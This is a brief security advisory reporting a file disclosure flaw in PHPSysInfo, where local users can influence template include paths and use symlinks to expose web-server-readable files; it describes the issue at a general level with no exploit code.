PHPSysInfo has been reported to be vulnerable to a file disclosure issue.

Local users may be capable of influencing the include path for several PHPSysinfo template files. If the malicious template file is symlinked to a web server readable file, the contents of the linked file may be disclosed to the attacker.

This attack may lead to confidential or sensitive information disclosure, which could be used to launch other attacks.
